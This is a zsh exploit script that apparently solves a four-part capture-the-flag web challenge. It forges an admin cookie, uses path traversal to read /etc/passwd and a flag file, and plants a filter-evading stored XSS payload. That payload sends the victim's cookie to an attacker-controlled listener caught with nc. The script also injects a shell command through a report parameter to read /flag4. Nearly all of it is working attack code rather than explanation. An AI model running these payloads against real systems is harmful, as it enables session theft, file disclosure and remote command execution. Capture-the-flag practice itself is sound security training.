#!/bin/zsh
# set -x

source .env
LIP=""

USER=""
PASS=""

Cookie="username=$USER; password=$PASS; is_admin=true"

# set up account
curl -s "$HOST/login" -d "username=$USER&password=$PASS" | jq -r ".done"

# part1
curl -s -H "Cookie: $Cookie" "$HOST/flag1" | jq -r ".FLAG1"

# part2
fn=$(curl -s --path-as-is "$HOST/..././..././..././..././..././..././etc/passwd" | grep ForbiddenError | awk '{ print $25 }' | cut -d':' -f1 | cut -d'/' -f3)
curl -s --path-as-is "$HOST/..././$fn" | grep SCIST | awk '{ print $2 }'

# part3
body="<img oonnerror='locatioonn.href=\`$LIP/\`%2Bdocument.cookie.match(/(SCIST\S%2B);/)[1]' src='/'>"
curl -s -H "Cookie: $Cookie" "$HOST/save" -d "note=$body" | jq -r ".done"
key=$(curl -s -H "Cookie: $Cookie" "$HOST/share" -X POST | jq -r ".key")
curl -s -H "Cookie: $Cookie" "$HOST/report" -d "url=$HOST/share.html?key=$key" | jq -r ".done"
urldecode() { echo -e "$(sed 's/+/ /g;s/%\(..\)/\\x\1/g;')" }
nc -l 1234 | grep SCIST | awk '{ print $2 }' | cut -d'/' -f2 | head -n 1 | urldecode

# part4
curl -s -H "Cookie: $Cookie" "$HOST/report" -d "url[]=';cat /flag4;echo '" | jq -r ".msg" | grep SCIST
